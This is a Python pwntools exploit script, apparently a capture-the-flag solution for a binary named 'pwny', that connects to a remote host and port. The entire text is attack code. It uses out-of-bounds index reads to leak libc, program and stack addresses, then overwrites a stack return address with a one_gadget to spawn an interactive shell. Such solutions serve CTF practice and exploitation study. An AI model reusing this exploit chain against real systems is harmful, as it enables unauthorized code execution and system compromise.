from pwn import *

#p = process('./pwny')
p = remote('123.60.218.64','23880')
context.log_level = 'debug'
elf = ELF('./pwny')
libc = ELF('./libc-2.27.so')

def pwnwrite(mode,idx,text):
	p.sendlineafter('Your choice: ','2')
	p.sendlineafter('Index: ',str(idx))
	if(mode):
		p.sendline(text)

def pwnread(idx):
	p.sendlineafter('Your choice: ','1')
	p.sendlineafter('Index: ',str(idx))

pwnwrite(0,256,'0')
pwnwrite(0,256,'0') #set data as 0 to use stdin

pwnread(p64((-25)&0xffffffffffffffff))
p.recvuntil('Result: ')
puts = int(p.recvuntil('\n'),16)
log.success('puts==>'+hex(puts))
libc_base = puts - libc.sym['puts']
log.success('libc_base==>'+hex(libc_base))

pwnread(p64((-91)&0xffffffffffffffff))#off_201D88      dq offset sub_9C0
p.recvuntil('Result: ')
sub_9C0 = int(p.recvuntil('\n'),16)
log.success('sub_9C0==>'+hex(sub_9C0))
pbase = sub_9C0 - 0x9c0
log.success('pbase==>'+hex(pbase))

envir = libc_base + libc.sym['__environ']
pwnread(p64((envir-(pbase+0x202060))/8 & 0xffffffffffffffff))
p.recvuntil('Result: ')
stack = int(p.recvuntil('\n'),16)
log.success('stack==>'+hex(stack))
#gdb.attach(p)
#pause()
one_gadget = [0x4f3d5,0x4f432,0x10a41c]
pwnwrite(1,str( (((stack-0x120) - (pbase+0x202060))/8) & 0xffffffffffffffff), p64(one_gadget [2]+libc_base))
#gdb.attach(p)
p.interactive()
